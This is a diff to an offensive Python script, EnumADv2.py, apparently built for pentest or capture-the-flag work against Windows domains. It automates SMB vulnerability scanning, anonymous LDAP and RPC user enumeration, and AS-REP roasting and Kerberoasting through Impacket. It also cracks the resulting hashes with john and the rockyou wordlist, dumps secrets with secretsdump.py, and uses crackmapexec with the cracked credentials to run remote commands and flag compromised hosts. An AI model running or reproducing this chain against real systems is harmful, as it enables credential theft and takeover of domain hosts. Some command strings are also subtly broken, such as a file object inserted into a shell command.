@@ -1,3 +1,18 @@
+#!/usr/bin/python3
+
+#To Download Files
+	#python EnumADv2.py -D
+#To run with RustScan
+	#python EnumADv2.py -r <RHOST> -R 
+#To run with NMAP
+	#example python EnumADv2.py -r <RHOST> -n
+
+#Things to do:
+	#Add Support for usernames file
+	#Add more support for username and password	
+	#Add support for hashes file
+	#Add NTLMRELAYX support
+
 import os
 import argparse
 import sys
@@ -111,7 +126,7 @@ def BLUE():
 		content = f.read()
 		word="445/tcp"
 		if word in content:
-			print(f"{MAGENTA}SMB is running, checking if it is vulnerable to anything with nmap scripts{RESET}")
+			print(f"{MAGENTA}SMB is running, checking if it is vulnerable to anything with nmap scripts{RESET}\n")
 			os.system(f"nmap -p 445 --script=smb-vuln* -Pn {RHOST} > blue.txt")
 			with open ("blue.txt", "r") as f:
 				content = f.read()
@@ -214,7 +229,7 @@ def LDAPSEARCH():
 	path="ports.txt"
 	with open (path, "r") as f:
 		content = f.read()
-		word="636/tcp"
+		word="389/tcp"
 	if word in content:
 		print(f"LDAP Running")
 		os.system(f"crackmapexec smb {RHOST} -u fdjakf -p fdafjklf | tail -n 1 | cut -d ']' -f 2 | cut -d '\' -f 1 | tr -d \ \" \\t\\n\\r\\\" | sed -e 's/\x1b\[[0-9;]*m//g' > domainname.txt")
@@ -230,6 +245,8 @@ def LDAPSEARCH():
 		if USERNAME is None and PASSWORD is None:
 			print(f"{MAGENTA}Trying Anonymous LDAP Login and saving any output to ldap.txt{RESET}")
 			os.system(f"ldapsearch -H ldap://{RHOST} -x -b \"DC={x},DC={y}\" '(objectclass=person)' > ldap.txt")
+			os.remove("dom1.txt")
+			os.remove("dom2.txt")
 			path = "ldap.txt"
 			with open (path, "r") as f:
 				content = f.read()
@@ -243,20 +260,24 @@ def LDAPSEARCH():
 					os.remove("cut1.txt")
 					print(f"\n {YELLOW}Saved users to ldapusers.txt{RESET}")
 					
-
 		if USERNAME is not None and PASSWORD is not None:
 			print(f"{MAGENTA}Trying to dump LDAP with username {YELLOW}{USERNAME} and password {YELLOW}{PASSWORD} {RESET}")
 			os.system(f"ldapsearch -H ldap://{RHOST} -x -b \"DC={x},DC={y}\" '(objectclass=person)' -D {USERNAME} -w {PASSWORD} > ldap.txt")
-		os.remove("dom1.txt")
-		os.remove("dom2.txt")
-		os.system("cat ldap.txt | grep -i samaccountname > users.txt")
-		os.system("cat ldap.txt | grep -i description > description.txt")
+			os.remove("dom1.txt")
+			os.remove("dom2.txt")
+			os.system("cat ldap.txt | grep -i description > description.txt")
+			os.system(f"cat ldap.txt | grep -i samaccountname > cut.txt")
+			os.system(f"cut -d ':' -f 2 cut.txt > cut1.txt")
+			os.system(f"cat cut1.txt| sed 's/ //g' > ldapusers.txt")
+			os.remove("cut.txt")
+			os.remove("cut1.txt")
+			print(f"\n {YELLOW}Saved users to ldapusers.txt{RESET}")
 
 def LDAPDOMAINDUMP():
 	path="ports.txt"
 	with open (path, "r") as f:
 		content = f.read()
-		word="636/tcp"
+		word="389/tcp"
 	if word in content:
 		print(f"{YELLOW}LDAP Running, trying LDAPDOMAINDUMP and putting into folder LDAP{RESET}")
 	try:
@@ -270,8 +291,51 @@ def LDAPDOMAINDUMP():
 	if USERNAME is not None and PASSWORD is not None:
 		os.system(f"ldapdomaindump ldap://{RHOST} -u '{y}\\{USERNAME}' -p '{PASSWORD}'")
 	if USERNAME is None and PASSWORD is None:
-		os.system(f"ldapdomaindump ldap://{RHOST}")
+		os.system(f"ldapdomaindump ldap://{RHOST}:389")
 	os.chdir('..')
+
+def KLDAP():
+	content = "ldapusers.txt"
+	if (os.path.isfile(content) is not False):
+		print(f"{YELLOW}{content} file found, trying some things{RESET}")
+		with open ("domainname.txt", "r") as a:
+			z = a.read()
+			with open (content, "r") as f:
+				os.system(f"GetNPUsers.py -no-pass -usersfile {f} {z}/ > impacket.txt")
+				os.system(f"GetUserSPNs.py -no-pass -usersfile {f} {z}/ >> impacket.txt")
+				with open ("impacket.txt", "r") as f:
+					content = f.read()
+					word = "$krb"
+					if word in content:
+						print(f"{RED}Found Kerberoastable User, check impacket.txt{RESET} \n")	
+						os.system(f"cut -d '_' -f 6 impacket.txt > cut1.txt")
+						os.system(f"cut -d '+' -f 3 cut1.txt > cut2.txt")
+						os.system(f"cut -d ']' -f 5 cut2.txt > cut3.txt")
+						os.system(f'cat cut3.txt | tr -d " \t\n\r" > hash.txt')
+						os.remove("cut1.txt")
+						os.remove("cut2.txt")
+						os.remove("cut3.txt")
+						with open ("hash.txt", "r") as f:
+							content = f.read()
+							print(f"{GREEN}Kerberostable hash is {RED}{content}{RESET} \n")
+						os.system("cut -d '$' -f 4 hash.txt > cut4.txt")
+						os.system("cut -d '@' -f 1 cut4.txt > keruser.txt")
+						os.remove("cut4.txt")
+						with open ("keruser.txt", "r") as f:
+							content = f.read()
+							print(f"{YELLOW}Kerberostable username is {RED}{content}{RESET} \n")
+						if (os.path.isfile("johnpass.txt") is not True):
+							print(f"{YELLOW}Trying to crack KRB hash {RESET}")
+							os.system("john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --fork=4 > johnpass.txt")
+							os.system("cut -d '/' -f 6 johnpass.txt > cut5.txt")
+							os.system("cut -d '(' -f 1 cut5.txt > cut6.txt")
+							os.system('cat cut6.txt | tr -d " \t\n\r" > johnpass.txt')
+							os.remove('cut5.txt')
+							os.remove('cut6.txt')
+							with open ("johnpass.txt", "r") as f:
+								content = f.read()
+								print(f"{YELLOW}Kerberostable password is {RED}{content}{RESET} \n")
+							os.system(f"crackmapexec smb {RHOST} -u keruser.txt -p johnpass.txt -X 'whoami'")
 
 def MSSQL():
 	path="ports.txt"
@@ -296,59 +360,27 @@ def RPC():
 		word="135/tcp"
 		if word in content:
 			print(f"{YELLOW}RPCClient is running, trying anonymous access{RESET}")
-			os.system(f'rpcclient -U "" -N {RHOST} -c "enumdomusers" > users1.txt')
-		with open ("users1.txt", "r") as a:
-			content = a.read()
-			word = "Administrator"
-			if word in content:
-				print(f"{YELLOW}Anonymous RPC access allowed, making rpcusers.txt file{RESET}")
+			if USERNAME is None and PASSWORD is None:
+				os.system(f'rpcclient -U "" -N {RHOST} -c "enumdomusers" > users1.txt')
+			with open ("users1.txt", "r") as a:
+				content = a.read()
+				word = "Administrator"
+				if word in content:
+					print(f"{GREEN}Anonymous RPC access allowed, making rpcusers.txt file{RESET}")
+					os.system("cut -d '[' -f 2 users1.txt > cut1.txt")
+					os.system("cut -d ']' -f 1 cut1.txt > rpcusers.txt")
+					os.remove("cut1.txt")
+					os.remove("users1.txt")
+			if USERNAME is not None and PASSWORD is not None:
+				with open ("domainname.txt", "r") as a:
+					z = a.read()
+				os.system(f"rpcclient -U {z}/{USERNAME}%{PASSWORD} -N {RHOST} -c 'enumdomusers > users1.txt'")
 				os.system("cut -d '[' -f 2 users1.txt > cut1.txt")
 				os.system("cut -d ']' -f 1 cut1.txt > rpcusers.txt")
 				os.remove("cut1.txt")
 				os.remove("users1.txt")
-						
-def IMPACKET():
-	content = "ldapusers.txt"
-	if (os.path.isfile(content) is not False):
-		print(f"{YELLOW}{content} file found, trying some things{RESET}")
-		with open ("domainname.txt", "r") as a:
-			z = a.read()
-			with open (content, "r") as f:
-				y = f.read()
-				os.system(f"GetNPUsers.py -no-pass -usersfile {content} {z}/ > impacket.txt")
-				os.system(f"GetUserSPNs.py -no-pass -usersfile {content} {z}/ >> impacket.txt")
-				with open ("impacket.txt", "r") as f:
-					content = f.read()
-					word = "$krb"
-					if word in content:
-						print(f"{RED}Found Kerberoastable User, check impacket.txt{RESET} \n")	
-						os.system(f"cut -d '_' -f 6 impacket.txt > cut1.txt")
-						os.system(f"cut -d '+' -f 3 cut1.txt > cut2.txt")
-						os.system(f"cut -d ']' -f 5 cut2.txt > cut3.txt")
-						os.system(f'cat cut3.txt | tr -d " \t\n\r" > hash.txt')
-						os.remove("cut1.txt")
-						os.remove("cut2.txt")
-						os.remove("cut3.txt")
-						with open ("hash.txt", "r") as f:
-							content = f.read()
-							print(f"{GREEN}Kerberostable hash is {RED}{content}{RESET} \n")
-						os.system("cut -d '$' -f 4 hash.txt > cut4.txt")
-						os.system("cut -d '@' -f 1 cut4.txt > keruser.txt")
-						os.remove("cut4.txt")
-						with open ("keruser.txt", "r") as f:
-							content = f.read()
-							print(f"{YELLOW}Kerberostable username is {RED}{content}{RESET} \n")
-						print(f"{YELLOW}Trying to crack KRB hash {RESET}")
-						os.system("john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --fork=4 > johnpass.txt")
-						os.system("cut -d '/' -f 6 johnpass.txt > cut5.txt")
-						os.system("cut -d '(' -f 1 cut5.txt > cut6.txt")
-						os.system('cat cut6.txt | tr -d " \t\n\r" > johnpass.txt')
-						os.remove('cut5.txt')
-						os.remove('cut6.txt')
-						with open ("johnpass.txt", "r") as f:
-							content = f.read()
-							print(f"{YELLOW}Kerberostable password is {RED}{content}{RESET} \n")
-						os.system(f"crackmapexec smb {RHOST} -u keruser.txt -p johnpass.txt -X 'whoami'")
+
+def KRPC():
 	content = "rpcusers.txt"
 	if (os.path.isfile(content) is not False):
 		print(f"{YELLOW}{content} file found, trying some things{RESET}")
@@ -390,6 +422,9 @@ def IMPACKET():
 							content = f.read()
 							print(f"{YELLOW}Kerberostable password is {RED}{content}{RESET} \n")
 						os.system(f"crackmapexec smb {RHOST} -u keruser.txt -p johnpass.txt -X 'whoami'")
+
+def IMPACKET():
+
 	if USERNAME == None and PASSWORD == None and USERSFILE is not None:
 		users = input (f"{RED}Usernames file, if none press enter{RESET}")
 		a = input (f"{RED}Make sure domain name is in /etc/hosts or following attacks will not work")
@@ -401,7 +436,7 @@ def IMPACKET():
 				os.system(f"GetNPUsers.py -no-pass -usersfile {users} {y}")
 				os.system(f"GetUserSPNs.py -no-pass -usersfile {users} {y}")
 	if USERNAME is not None and PASSWORD is not None:
-		print(f"{YELLOW}Running Impacket attacks with {USERNAME} and {PASSWORD}")
+		print(f"{YELLOW}Running Impacket attacks with {USERNAME} and {PASSWORD}{RESET} \n")
 		with open ("domainname.txt", "r") as f:
 			y = f.read()
 			os.system(f"GetADUsers.py {y}/{USERNAME}:{PASSWORD} > impacket.txt")
@@ -411,6 +446,41 @@ def IMPACKET():
 			os.system(f"GetUserSPNs.py {y}/{USERNAME}:{PASSWORD} -request >> impacket.txt")
 			os.system(f"lookupsid.py {y}/{USERNAME}:{PASSWORD}@{y} >> impacket.txt")
 			os.system(f"secretsdump.py {y}/{USERNAME}:{PASSWORD}@{y} > secretsdump.txt")
+
+def CRACKMAPEXEC():
+	if USERNAME is None and PASSWORD is None and USERSFILE is None:
+		if (os.path.isfile("johnpass.txt") == True):
+			print(f"\n{YELLOW}Running Crackmapexec if possible{RESET} \n")
+			print(f"{YELLOW}Saving everything to crack.txt{RED}")
+			print(f"{RED}If screen seems frozen you are good and everything is being saved, just hit enter after a minute or two{RESET} \n")
+			c = "crackmapexec smb"
+			w = "crackmapexec winrm"
+			l = "crackmapexec ldap"
+			path = "crack.txt"
+			os.system(f"{c} {RHOST} -u keruser.txt -p johnpass.txt --shares --sessions --loggedon-users --users > {path}")
+			os.system(f"{c} {RHOST} -u keruser.txt -p johnpass.txt > crack_smb.txt")
+			with open (f"crack_smb.txt", "r") as f:
+				content = f.read()
+				word = "Pwn3d!"
+				if word in content:
+					print(f"\n{RED}***Pwn3d! system with {YELLOW}{c}{RED}***{RESET}")
+					time.sleep(2)
+			os.system(f"{l} {RHOST} -u keruser.txt -p johnpass.txt --admin-count --trusted-for-delegation --password-not-required --users --groups >> {path}")
+			os.system(f"{l} {RHOST} -u keruser.txt -p johnpass.txt > crack_ldap.txt")
+			with open (f"crack_ldap.txt", "r") as f:
+				content = f.read()
+				word = "Pwn3d!"
+				if word in content:
+					print(f"\n{RED}***Pwn3d! system with {YELLOW}{l}{RED}***{RESET}")
+					time.sleep(2)
+			os.system(f"{w} {RHOST} -u keruser.txt -p johnpass.txt >> {path}")
+			os.system(f"{w} {RHOST} -u keruser.txt -p johnpass.txt > crack_winrm.txt")
+			with open (f"crack_winrm.txt", "r") as f:
+				content = f.read()
+				word = "Pwn3d!"
+				if word in content:
+					print(f"\n{RED}***Pwn3d! system with {YELLOW}{w}{RED}***{RESET}")
+					time.sleep(2)
 
 if DOWNLOAD == True:
 	DOWN()
@@ -422,8 +492,11 @@ if RHOST is not False:
 	DOM()
 	BLUE()
 	RPC()
+	KRPC()
 	LDAPSEARCH()
+	KLDAP()
 	IMPACKET()
+	CRACKMAPEXEC()
 	MSSQL()
 	MOUNT()
 	LDAPDOMAINDUMP()
